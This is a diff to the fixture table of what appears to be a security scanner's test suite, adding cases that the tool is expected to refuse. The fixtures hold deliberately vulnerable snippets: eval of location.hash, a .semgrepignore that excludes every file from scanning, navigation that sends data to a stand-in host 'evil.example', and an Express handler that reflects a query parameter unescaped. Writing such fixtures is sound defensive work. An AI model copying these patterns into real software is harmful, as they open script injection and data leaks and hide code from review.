@@ -87,6 +87,12 @@ FIXTURES = {
     "bad/protocol-relative-nav": ("REFUSE", ["client-external-navigation"], node_app("proto-rel", {
         "server.js": SAFE_SERVER,
         "public/app.js": "location.href = '//evil.example/?d=1';\n"})),
+    "bad/hidden-in-tests-dir": ("REFUSE", ["client-eval"], node_app("hidden-tests", {
+        "server.js": SAFE_SERVER,
+        "tests/setup.js": "eval(location.hash.slice(1));\n"})),
+    "bad/semgrepignore-bypass": ("REFUSE", ["client-eval", "scanner-ignore-file"], node_app("ignore-bypass", {
+        "server.js": SAFE_SERVER, ".semgrepignore": "*\n",
+        "public/app.js": "eval(location.hash.slice(1));\n"})),
     "bad/reflected-xss": ("REFUSE", ["server-reflected-xss"], node_app("reflected", {
         "server.js": "const express = require('express');\nconst app = express();\napp.get('/echo', (req, res) => {\n  res.send(`<div>echo: ${req.query.q}</div>`);\n});\napp.listen(8080);\n"})),
     "bad/webrtc": ("REFUSE", ["client-webrtc"], node_app("webrtc", {
